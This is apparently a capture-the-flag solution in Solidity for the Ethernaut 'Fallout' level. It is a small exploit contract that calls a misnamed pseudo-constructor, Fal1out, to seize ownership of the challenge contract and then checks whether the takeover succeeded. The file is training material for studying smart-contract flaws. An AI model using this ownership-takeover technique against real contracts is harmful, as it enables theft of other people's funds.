//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IFallout {
    function owner() external view returns (address);

    function Fal1out() external payable;

    function allocate() external payable;

    function sendAllocation(address payable _allocator) external;

    function collectAllocations() external;

    function allocatorBalance(address _allocator)
        external
        view
        returns (uint256);
}

contract FalloutExploit {
    IFallout public implementation;
    address owner;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Fallout` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7
    constructor(IFallout _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Call the `Fal1out` function which is mistaken for the `Fallout` contract's constructor
    function exploit() external payable {
        require(msg.sender == owner, "not owner");
        implementation.Fal1out{value: msg.value}();
    }

    /// @notice Returns a boolean wheter the `implementation` contract has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.owner() == owner;
    }
}
